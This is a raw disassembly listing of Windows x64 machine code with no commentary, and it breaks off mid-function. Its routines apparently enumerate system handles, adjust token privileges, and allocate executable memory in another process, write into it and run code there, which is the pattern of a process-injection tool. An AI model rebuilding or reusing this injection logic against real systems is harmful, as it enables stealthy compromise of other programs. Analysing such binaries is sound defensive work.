   140006787:	48 83 ec 60          	sub    $0x60,%rsp
   14000678b:	8b f2                	mov    %edx,%esi
   14000678d:	48 8b d1             	mov    %rcx,%rdx
   140006790:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006795:	41 8b d9             	mov    %r9d,%ebx
   140006798:	49 8b f8             	mov    %r8,%rdi
   14000679b:	e8 a8 eb ff ff       	call   0x140005348
   1400067a0:	44 8b 9c 24 a8 00 00 	mov    0xa8(%rsp),%r11d
   1400067a7:	00 
   1400067a8:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   1400067af:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400067b4:	44 89 5c 24 30       	mov    %r11d,0x30(%rsp)
   1400067b9:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400067bd:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   1400067c4:	00 
   1400067c5:	44 8b cb             	mov    %ebx,%r9d
   1400067c8:	4c 8b c7             	mov    %rdi,%r8
   1400067cb:	8b d6                	mov    %esi,%edx
   1400067cd:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400067d2:	e8 45 fe ff ff       	call   0x14000661c
   1400067d7:	80 7c 24 58 00       	cmpb   $0x0,0x58(%rsp)
   1400067dc:	74 0c                	je     0x1400067ea
   1400067de:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400067e3:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   1400067ea:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1400067ef:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   1400067f4:	48 83 c4 60          	add    $0x60,%rsp
   1400067f8:	5f                   	pop    %rdi
   1400067f9:	c3                   	ret
   1400067fa:	cc                   	int3
   1400067fb:	cc                   	int3
   1400067fc:	cc                   	int3
   1400067fd:	cc                   	int3
   1400067fe:	cc                   	int3
   1400067ff:	cc                   	int3
   140006800:	cc                   	int3
   140006801:	cc                   	int3
   140006802:	cc                   	int3
   140006803:	cc                   	int3
   140006804:	cc                   	int3
   140006805:	cc                   	int3
   140006806:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000680d:	00 00 00 
   140006810:	48 83 ec 10          	sub    $0x10,%rsp
   140006814:	4c 89 14 24          	mov    %r10,(%rsp)
   140006818:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   14000681d:	4d 33 db             	xor    %r11,%r11
   140006820:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   140006825:	4c 2b d0             	sub    %rax,%r10
   140006828:	4d 0f 42 d3          	cmovb  %r11,%r10
   14000682c:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   140006833:	00 00 
   140006835:	4d 3b d3             	cmp    %r11,%r10
   140006838:	73 16                	jae    0x140006850
   14000683a:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   140006840:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   140006847:	41 c6 03 00          	movb   $0x0,(%r11)
   14000684b:	4d 3b d3             	cmp    %r11,%r10
   14000684e:	75 f0                	jne    0x140006840
   140006850:	4c 8b 14 24          	mov    (%rsp),%r10
   140006854:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   140006859:	48 83 c4 10          	add    $0x10,%rsp
   14000685d:	c3                   	ret
   14000685e:	ff 25 9c 1a 00 00    	jmp    *0x1a9c(%rip)        # 0x140008300
   140006864:	ff 25 7e 1a 00 00    	jmp    *0x1a7e(%rip)        # 0x1400082e8
   14000686a:	ff 25 80 1a 00 00    	jmp    *0x1a80(%rip)        # 0x1400082f0
   140006870:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140006875:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000687a:	56                   	push   %rsi
   14000687b:	57                   	push   %rdi
   14000687c:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
   140006883:	c7 44 24 48 00 00 01 	movl   $0x10000,0x48(%rsp)
   14000688a:	00 
   14000688b:	8b 44 24 48          	mov    0x48(%rsp),%eax
   14000688f:	8b c8                	mov    %eax,%ecx
   140006891:	e8 96 b5 ff ff       	call   0x140001e2c
   140006896:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000689b:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%rsp)
   1400068a2:	00 
   1400068a3:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   1400068a7:	89 44 24 48          	mov    %eax,0x48(%rsp)
   1400068ab:	8b 44 24 48          	mov    0x48(%rsp),%eax
   1400068af:	8b d0                	mov    %eax,%edx
   1400068b1:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400068b6:	e8 c1 f3 ff ff       	call   0x140005c7c
   1400068bb:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400068c0:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   1400068c5:	44 8b 44 24 48       	mov    0x48(%rsp),%r8d
   1400068ca:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   1400068cf:	b9 10 00 00 00       	mov    $0x10,%ecx
   1400068d4:	e8 4b 09 00 00       	call   0x140007224
   1400068d9:	89 44 24 50          	mov    %eax,0x50(%rsp)
   1400068dd:	81 7c 24 50 04 00 00 	cmpl   $0xc0000004,0x50(%rsp)
   1400068e4:	c0 
   1400068e5:	74 bc                	je     0x1400068a3
   1400068e7:	c7 44 24 54 00 00 00 	movl   $0x0,0x54(%rsp)
   1400068ee:	00 
   1400068ef:	eb 0a                	jmp    0x1400068fb
   1400068f1:	8b 44 24 54          	mov    0x54(%rsp),%eax
   1400068f5:	ff c0                	inc    %eax
   1400068f7:	89 44 24 54          	mov    %eax,0x54(%rsp)
   1400068fb:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140006900:	8b 00                	mov    (%rax),%eax
   140006902:	39 44 24 54          	cmp    %eax,0x54(%rsp)
   140006906:	0f 83 01 01 00 00    	jae    0x140006a0d
   14000690c:	8b 44 24 54          	mov    0x54(%rsp),%eax
   140006910:	48 6b c0 18          	imul   $0x18,%rax,%rax
   140006914:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   14000691b:	00 
   14000691c:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140006921:	48 8b f9             	mov    %rcx,%rdi
   140006924:	48 8d 74 02 08       	lea    0x8(%rdx,%rax,1),%rsi
   140006929:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000692e:	f3 a4                	rep movsb (%rsi),(%rdi)
   140006930:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140006935:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   14000693c:	00 
   14000693d:	48 8b f8             	mov    %rax,%rdi
   140006940:	48 8b f1             	mov    %rcx,%rsi
   140006943:	b9 18 00 00 00       	mov    $0x18,%ecx
   140006948:	f3 a4                	rep movsb (%rsi),(%rdi)
   14000694a:	48 8b 8c 24 c0 00 00 	mov    0xc0(%rsp),%rcx
   140006951:	00 
   140006952:	ff 15 98 17 00 00    	call   *0x1798(%rip)        # 0x1400080f0
   140006958:	39 44 24 58          	cmp    %eax,0x58(%rsp)
   14000695c:	0f 85 a6 00 00 00    	jne    0x140006a08
   140006962:	48 c7 44 24 70 00 00 	movq   $0x0,0x70(%rsp)
   140006969:	00 00 
   14000696b:	ff 15 b7 18 00 00    	call   *0x18b7(%rip)        # 0x140008228
   140006971:	0f b7 4c 24 5e       	movzwl 0x5e(%rsp),%ecx
   140006976:	c7 44 24 30 02 00 00 	movl   $0x2,0x30(%rsp)
   14000697d:	00 
   14000697e:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140006985:	00 
   140006986:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   14000698d:	00 
   14000698e:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140006993:	4c 8b c0             	mov    %rax,%r8
   140006996:	8b d1                	mov    %ecx,%edx
   140006998:	48 8b 8c 24 c0 00 00 	mov    0xc0(%rsp),%rcx
   14000699f:	00 
   1400069a0:	ff 15 da 16 00 00    	call   *0x16da(%rip)        # 0x140008080
   1400069a6:	85 c0                	test   %eax,%eax
   1400069a8:	74 5e                	je     0x140006a08
   1400069aa:	ba 02 00 00 00       	mov    $0x2,%edx
   1400069af:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   1400069b4:	e8 77 00 00 00       	call   0x140006a30
   1400069b9:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   1400069be:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   1400069c3:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   1400069ca:	00 
   1400069cb:	48 8b 84 24 c8 00 00 	mov    0xc8(%rsp),%rax
   1400069d2:	00 
   1400069d3:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   1400069da:	00 
   1400069db:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1400069df:	48 2b c8             	sub    %rax,%rcx
   1400069e2:	0f b7 10             	movzwl (%rax),%edx
   1400069e5:	66 3b 14 08          	cmp    (%rax,%rcx,1),%dx
   1400069e9:	75 0d                	jne    0x1400069f8
   1400069eb:	48 83 c0 02          	add    $0x2,%rax
   1400069ef:	66 85 d2             	test   %dx,%dx
   1400069f2:	75 ee                	jne    0x1400069e2
   1400069f4:	33 c0                	xor    %eax,%eax
   1400069f6:	eb 05                	jmp    0x1400069fd
   1400069f8:	1b c0                	sbb    %eax,%eax
   1400069fa:	83 d8 ff             	sbb    $0xffffffff,%eax
   1400069fd:	85 c0                	test   %eax,%eax
   1400069ff:	75 07                	jne    0x140006a08
   140006a01:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140006a06:	eb 11                	jmp    0x140006a19
   140006a08:	e9 e4 fe ff ff       	jmp    0x1400068f1
   140006a0d:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140006a12:	e8 d5 b3 ff ff       	call   0x140001dec
   140006a17:	33 c0                	xor    %eax,%eax
   140006a19:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
   140006a20:	5f                   	pop    %rdi
   140006a21:	5e                   	pop    %rsi
   140006a22:	c3                   	ret
   140006a23:	cc                   	int3
   140006a24:	cc                   	int3
   140006a25:	cc                   	int3
   140006a26:	cc                   	int3
   140006a27:	cc                   	int3
   140006a28:	cc                   	int3
   140006a29:	cc                   	int3
   140006a2a:	cc                   	int3
   140006a2b:	cc                   	int3
   140006a2c:	cc                   	int3
   140006a2d:	cc                   	int3
   140006a2e:	cc                   	int3
   140006a2f:	cc                   	int3
   140006a30:	89 54 24 10          	mov    %edx,0x10(%rsp)
   140006a34:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140006a39:	48 83 ec 48          	sub    $0x48,%rsp
   140006a3d:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140006a44:	00 
   140006a45:	c7 44 24 34 04 00 00 	movl   $0xc0000004,0x34(%rsp)
   140006a4c:	c0 
   140006a4d:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140006a54:	00 00 
   140006a56:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140006a5a:	8b d0                	mov    %eax,%edx
   140006a5c:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140006a61:	e8 16 f2 ff ff       	call   0x140005c7c
   140006a66:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140006a6b:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140006a70:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006a75:	44 8b 4c 24 30       	mov    0x30(%rsp),%r9d
   140006a7a:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   140006a7f:	8b 54 24 58          	mov    0x58(%rsp),%edx
   140006a83:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140006a88:	ff 15 82 18 00 00    	call   *0x1882(%rip)        # 0x140008310
   140006a8e:	89 44 24 34          	mov    %eax,0x34(%rsp)
   140006a92:	81 7c 24 34 04 00 00 	cmpl   $0xc0000004,0x34(%rsp)
   140006a99:	c0 
   140006a9a:	74 ba                	je     0x140006a56
   140006a9c:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140006aa1:	48 83 c4 48          	add    $0x48,%rsp
   140006aa5:	c3                   	ret
   140006aa6:	cc                   	int3
   140006aa7:	cc                   	int3
   140006aa8:	cc                   	int3
   140006aa9:	cc                   	int3
   140006aaa:	cc                   	int3
   140006aab:	cc                   	int3
   140006aac:	cc                   	int3
   140006aad:	cc                   	int3
   140006aae:	cc                   	int3
   140006aaf:	cc                   	int3
   140006ab0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140006ab5:	48 83 ec 28          	sub    $0x28,%rsp
   140006ab9:	48 8d 15 80 31 00 00 	lea    0x3180(%rip),%rdx        # 0x140009c40
   140006ac0:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140006ac5:	e8 a6 fd ff ff       	call   0x140006870
   140006aca:	48 83 c4 28          	add    $0x28,%rsp
   140006ace:	c3                   	ret
   140006acf:	cc                   	int3
   140006ad0:	48 83 ec 38          	sub    $0x38,%rsp
   140006ad4:	48 8b 0d 8d 66 00 00 	mov    0x668d(%rip),%rcx        # 0x14000d168
   140006adb:	e8 d0 ff ff ff       	call   0x140006ab0
   140006ae0:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006ae5:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140006aea:	48 83 c4 38          	add    $0x38,%rsp
   140006aee:	c3                   	ret
   140006aef:	cc                   	int3
   140006af0:	40 57                	rex push %rdi
   140006af2:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140006af9:	48 8d 0d 78 31 00 00 	lea    0x3178(%rip),%rcx        # 0x140009c78
   140006b00:	ff 15 5a 15 00 00    	call   *0x155a(%rip)        # 0x140008060
   140006b06:	48 8d 15 53 31 00 00 	lea    0x3153(%rip),%rdx        # 0x140009c60
   140006b0d:	48 8b c8             	mov    %rax,%rcx
   140006b10:	ff 15 4a 16 00 00    	call   *0x164a(%rip)        # 0x140008160
   140006b16:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   140006b1d:	00 
   140006b1e:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140006b25:	00 00 
   140006b27:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140006b2c:	48 8b f8             	mov    %rax,%rdi
   140006b2f:	33 c0                	xor    %eax,%eax
   140006b31:	b9 40 00 00 00       	mov    $0x40,%ecx
   140006b36:	f3 aa                	rep stos %al,(%rdi)
   140006b38:	48 8b 05 31 66 00 00 	mov    0x6631(%rip),%rax        # 0x14000d170
   140006b3f:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140006b44:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   140006b4b:	00 
   140006b4c:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   140006b52:	41 b8 48 00 00 00    	mov    $0x48,%r8d
   140006b58:	33 d2                	xor    %edx,%edx
   140006b5a:	48 8b 0d 07 66 00 00 	mov    0x6607(%rip),%rcx        # 0x14000d168
   140006b61:	ff 15 01 15 00 00    	call   *0x1501(%rip)        # 0x140008068
   140006b67:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140006b6e:	00 
   140006b6f:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140006b76:	00 00 
   140006b78:	41 b9 48 00 00 00    	mov    $0x48,%r9d
   140006b7e:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140006b83:	48 8b 94 24 80 00 00 	mov    0x80(%rsp),%rdx
   140006b8a:	00 
   140006b8b:	48 8b 0d d6 65 00 00 	mov    0x65d6(%rip),%rcx        # 0x14000d168
   140006b92:	ff 15 d8 14 00 00    	call   *0x14d8(%rip)        # 0x140008070
   140006b98:	e8 33 ff ff ff       	call   0x140006ad0
   140006b9d:	48 89 05 d4 65 00 00 	mov    %rax,0x65d4(%rip)        # 0x14000d178
   140006ba4:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140006bab:	00 00 
   140006bad:	45 33 c9             	xor    %r9d,%r9d
   140006bb0:	45 33 c0             	xor    %r8d,%r8d
   140006bb3:	48 8b 94 24 80 00 00 	mov    0x80(%rsp),%rdx
   140006bba:	00 
   140006bbb:	48 8b 0d b6 65 00 00 	mov    0x65b6(%rip),%rcx        # 0x14000d178
   140006bc2:	ff 94 24 88 00 00 00 	call   *0x88(%rsp)
   140006bc9:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   140006bd0:	5f                   	pop    %rdi
   140006bd1:	c3                   	ret
   140006bd2:	cc                   	int3
   140006bd3:	cc                   	int3
   140006bd4:	cc                   	int3
   140006bd5:	cc                   	int3
   140006bd6:	cc                   	int3
   140006bd7:	cc                   	int3
   140006bd8:	cc                   	int3
   140006bd9:	cc                   	int3
   140006bda:	cc                   	int3
   140006bdb:	cc                   	int3
   140006bdc:	cc                   	int3
   140006bdd:	cc                   	int3
   140006bde:	cc                   	int3
   140006bdf:	cc                   	int3
   140006be0:	89 54 24 10          	mov    %edx,0x10(%rsp)
   140006be4:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140006be9:	57                   	push   %rdi
   140006bea:	48 83 ec 50          	sub    $0x50,%rsp
   140006bee:	48 c7 44 24 30 ff ff 	movq   $0xffffffffffffffff,0x30(%rsp)
   140006bf5:	ff ff 
   140006bf7:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   140006bfe:	00 
   140006bff:	48 8d 44 24 3c       	lea    0x3c(%rsp),%rax
   140006c04:	48 8b f8             	mov    %rax,%rdi
   140006c07:	33 c0                	xor    %eax,%eax
   140006c09:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140006c0e:	f3 aa                	rep stos %al,(%rdi)
   140006c10:	ff 15 12 16 00 00    	call   *0x1612(%rip)        # 0x140008228
   140006c16:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140006c1b:	ba 28 00 00 00       	mov    $0x28,%edx
   140006c20:	48 8b c8             	mov    %rax,%rcx
   140006c23:	ff 15 0f 14 00 00    	call   *0x140f(%rip)        # 0x140008038
   140006c29:	85 c0                	test   %eax,%eax
   140006c2b:	75 07                	jne    0x140006c34
   140006c2d:	33 c0                	xor    %eax,%eax
   140006c2f:	e9 83 00 00 00       	jmp    0x140006cb7
   140006c34:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140006c3b:	00 
   140006c3c:	83 7c 24 68 00       	cmpl   $0x0,0x68(%rsp)
   140006c41:	74 0a                	je     0x140006c4d
   140006c43:	c7 44 24 48 02 00 00 	movl   $0x2,0x48(%rsp)
   140006c4a:	00 
   140006c4b:	eb 08                	jmp    0x140006c55
   140006c4d:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   140006c54:	00 
   140006c55:	8b 44 24 48          	mov    0x48(%rsp),%eax
   140006c59:	89 44 24 44          	mov    %eax,0x44(%rsp)
   140006c5d:	4c 8d 44 24 3c       	lea    0x3c(%rsp),%r8
   140006c62:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140006c67:	33 c9                	xor    %ecx,%ecx
   140006c69:	ff 15 d1 13 00 00    	call   *0x13d1(%rip)        # 0x140008040
   140006c6f:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   140006c76:	00 00 
   140006c78:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140006c7f:	00 00 
   140006c81:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   140006c87:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140006c8c:	33 d2                	xor    %edx,%edx
   140006c8e:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140006c93:	ff 15 97 13 00 00    	call   *0x1397(%rip)        # 0x140008030
   140006c99:	ff 15 81 14 00 00    	call   *0x1481(%rip)        # 0x140008120
   140006c9f:	85 c0                	test   %eax,%eax
   140006ca1:	74 04                	je     0x140006ca7
   140006ca3:	33 c0                	xor    %eax,%eax
   140006ca5:	eb 10                	jmp    0x140006cb7
   140006ca7:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140006cac:	ff 15 a6 13 00 00    	call   *0x13a6(%rip)        # 0x140008058
   140006cb2:	b8 01 00 00 00       	mov    $0x1,%eax
   140006cb7:	48 83 c4 50          	add    $0x50,%rsp
   140006cbb:	5f                   	pop    %rdi
   140006cbc:	c3                   	ret
   140006cbd:	cc                   	int3
   140006cbe:	cc                   	int3
   140006cbf:	cc                   	int3
   140006cc0:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006cc5:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   140006cca:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140006ccf:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140006cd3:	48 83 ec 48          	sub    $0x48,%rsp
   140006cd7:	ba 01 00 00 00       	mov    $0x1,%edx
   140006cdc:	48 8d 0d 3d 31 00 00 	lea    0x313d(%rip),%rcx        # 0x140009e20
   140006ce3:	e8 f8 fe ff ff       	call   0x140006be0
   140006ce8:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140006cef:	00 
   140006cf0:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140006cf5:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140006cf9:	e8 c2 04 00 00       	call   0x1400071c0
   140006cfe:	48 89 05 63 64 00 00 	mov    %rax,0x6463(%rip)        # 0x14000d168
   140006d05:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140006d0a:	48 8b 0d 57 64 00 00 	mov    0x6457(%rip),%rcx        # 0x14000d168
   140006d11:	48 89 08             	mov    %rcx,(%rax)
   140006d14:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140006d19:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006d1e:	44 8b 4c 24 70       	mov    0x70(%rsp),%r9d
   140006d23:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140006d28:	8b 54 24 60          	mov    0x60(%rsp),%edx
   140006d2c:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140006d31:	e8 2a 00 00 00       	call   0x140006d60
   140006d36:	48 89 05 33 64 00 00 	mov    %rax,0x6433(%rip)        # 0x14000d170
   140006d3d:	48 83 3d 2b 64 00 00 	cmpq   $0x0,0x642b(%rip)        # 0x14000d170
   140006d44:	00 
   140006d45:	74 05                	je     0x140006d4c
   140006d47:	e8 a4 fd ff ff       	call   0x140006af0
   140006d4c:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140006d50:	48 83 c4 48          	add    $0x48,%rsp
   140006d54:	c3                   	ret
   140006d55:	cc                   	int3
   140006d56:	cc                   	int3
   140006d57:	cc                   	int3
   140006d58:	cc                   	int3
   140006d59:	cc                   	int3
   140006d5a:	cc                   	int3
   140006d5b:	cc                   	int3
   140006d5c:	cc                   	int3
   140006d5d:	cc                   	int3
   140006d5e:	cc                   	int3
   140006d5f:	cc                   	int3
   140006d60:	44 89 4c 24 20       	mov    %r9d,0x20(%rsp)
   140006d65:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140006d6a:	89 54 24 10          	mov    %edx,0x10(%rsp)
   140006d6e:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140006d73:	57                   	push   %rdi
   140006d74:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140006d7b:	c6 44 24 38 00       	movb   $0x0,0x38(%rsp)
   140006d80:	48 8d 44 24 39       	lea    0x39(%rsp),%rax
   140006d85:	48 8b f8             	mov    %rax,%rdi
   140006d88:	33 c0                	xor    %eax,%eax
   140006d8a:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   140006d8f:	f3 aa                	rep stos %al,(%rdi)
   140006d91:	c7 44 24 58 00 00 00 	movl   $0x0,0x58(%rsp)
   140006d98:	00 
   140006d99:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   140006da0:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   140006da7:	00 
   140006da8:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   140006dae:	44 8b c0             	mov    %eax,%r8d
   140006db1:	33 d2                	xor    %edx,%edx
   140006db3:	48 8b 0d ae 63 00 00 	mov    0x63ae(%rip),%rcx        # 0x14000d168
   140006dba:	ff 15 a8 12 00 00    	call   *0x12a8(%rip)        # 0x140008068
   140006dc0:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140006dc5:	48 83 7c 24 30 00    	cmpq   $0x0,0x30(%rsp)
   140006dcb:	75 17                	jne    0x140006de4
   140006dcd:	ff 15 4d 13 00 00    	call   *0x134d(%rip)        # 0x140008120
   140006dd3:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
   140006dda:	00 
   140006ddb:	89 01                	mov    %eax,(%rcx)
   140006ddd:	33 c0                	xor    %eax,%eax
   140006ddf:	e9 cd 03 00 00       	jmp    0x1400071b1
   140006de4:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   140006deb:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140006df2:	00 00 
   140006df4:	44 8b c8             	mov    %eax,%r9d
   140006df7:	4c 8b 84 24 90 00 00 	mov    0x90(%rsp),%r8
   140006dfe:	00 
   140006dff:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   140006e04:	48 8b 0d 5d 63 00 00 	mov    0x635d(%rip),%rcx        # 0x14000d168
   140006e0b:	ff 15 5f 12 00 00    	call   *0x125f(%rip)        # 0x140008070
   140006e11:	85 c0                	test   %eax,%eax
   140006e13:	75 17                	jne    0x140006e2c
   140006e15:	ff 15 05 13 00 00    	call   *0x1305(%rip)        # 0x140008120
   140006e1b:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
   140006e22:	00 
   140006e23:	89 01                	mov    %eax,(%rcx)
   140006e25:	33 c0                	xor    %eax,%eax
   140006e27:	e9 85 03 00 00       	jmp    0x1400071b1
   140006e2c:	48 83 bc 24 a0 00 00 	cmpq   $0x0,0xa0(%rsp)
   140006e33:	00 00 
   140006e35:	0f 84 51 03 00 00    	je     0x14000718c
   140006e3b:	83 bc 24 a8 00 00 00 	cmpl   $0x0,0xa8(%rsp)
   140006e42:	00 
   140006e43:	0f 86 43 03 00 00    	jbe    0x14000718c
   140006e49:	8b 84 24 a8 00 00 00 	mov    0xa8(%rsp),%eax
   140006e50:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   140006e57:	00 
   140006e58:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   140006e5e:	44 8b c0             	mov    %eax,%r8d
   140006e61:	33 d2                	xor    %edx,%edx
   140006e63:	48 8b 0d fe 62 00 00 	mov    0x62fe(%rip),%rcx        # 0x14000d168
   140006e6a:	ff 15 f8 11 00 00    	call   *0x11f8(%rip)        # 0x140008068
   140006e70:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140006e75:	48 83 7c 24 68 00    	cmpq   $0x0,0x68(%rsp)
   140006e7b:	75 17                	jne    0x140006e94
   140006e7d:	ff 15 9d 12 00 00    	call   *0x129d(%rip)        # 0x140008120
   140006e83:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
   140006e8a:	00 
   140006e8b:	89 01                	mov    %eax,(%rcx)
   140006e8d:	33 c0                	xor    %eax,%eax
   140006e8f:	e9 1d 03 00 00       	jmp    0x1400071b1
   140006e94:	8b 84 24 a8 00 00 00 	mov    0xa8(%rsp),%eax
   140006e9b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140006ea2:	00 00 
   140006ea4:	44 8b c8             	mov    %eax,%r9d
   140006ea7:	4c 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%r8
   140006eae:	00 
   140006eaf:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   140006eb4:	48 8b 0d ad 62 00 00 	mov    0x62ad(%rip),%rcx        # 0x14000d168
   140006ebb:	ff 15 af 11 00 00    	call   *0x11af(%rip)        # 0x140008070
   140006ec1:	85 c0                	test   %eax,%eax
   140006ec3:	75 17                	jne    0x140006edc
   140006ec5:	ff 15 55 12 00 00    	call   *0x1255(%rip)        # 0x140008120
   140006ecb:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
   140006ed2:	00 
   140006ed3:	89 01                	mov    %eax,(%rcx)
   140006ed5:	33 c0                	xor    %eax,%eax
   140006ed7:	e9 d5 02 00 00       	jmp    0x1400071b1
   140006edc:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   140006ee3:	00 
   140006ee4:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
   140006eea:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   140006ef0:	33 d2                	xor    %edx,%edx
   140006ef2:	48 8b 0d 6f 62 00 00 	mov    0x626f(%rip),%rcx        # 0x14000d168
   140006ef9:	ff 15 69 11 00 00    	call   *0x1169(%rip)        # 0x140008068
   140006eff:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140006f04:	48 83 7c 24 60 00    	cmpq   $0x0,0x60(%rsp)
   140006f0a:	75 1c                	jne    0x140006f28
   140006f0c:	ff 15 0e 12 00 00    	call   *0x120e(%rip)        # 0x140008120
   140006f12:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
   140006f19:	00 
